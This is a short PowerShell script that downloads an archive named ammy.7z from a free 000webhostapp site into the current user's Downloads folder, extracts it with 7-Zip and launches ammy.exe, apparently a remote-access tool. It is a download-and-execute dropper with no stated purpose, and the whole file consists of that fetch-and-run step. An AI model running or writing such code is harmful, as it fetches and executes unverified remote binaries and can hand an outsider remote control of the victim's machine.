$7zipPath = "$env:ProgramFiles\7-Zip\7z.exe"
Set-Alias 7zip $7zipPath
$user = (Get-WmiObject -Class Win32_Process -Filter 'Name="explorer.exe"').
    GetOwner().
    User

function ammy {
    $url = "https://troantunes.000webhostapp.com/ammy.7z"
    Invoke-WebRequest -Uri $url -OutFile "C:\Users\$user\Downloads\ammy.7z"
    cd C:\Users\$user\Downloads
    7zip x ammy.7z
    Start-Process ammy.exe
}

ammy